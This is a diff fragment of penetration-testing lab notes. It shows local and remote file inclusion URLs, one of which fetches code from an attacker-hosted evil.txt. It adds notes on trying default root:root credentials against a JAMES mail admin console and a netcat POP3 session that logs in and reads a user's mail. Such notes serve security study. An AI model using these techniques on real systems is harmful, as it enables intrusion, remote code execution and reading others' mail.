@@ -150,7 +150,29 @@ http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
 ```
 http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
 ```
+## SMTP
 
+- [ ] If JAMPS Admin Control is present try root:root and listusers a setpassword 
+
+## POP3
+
+Read emails:
+
+```
+nc -nvC 10.11.1.72 110
+(UNKNOWN) [10.11.1.72] 110 (pop3) open
++OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER ryuu
++OK
+PASS 123
++OK Welcome ryuu
+list
++OK 2 1807
+1 786
+2 1021
+.
+retr 1
+```
 
 ## FTP
 Default Port: 21
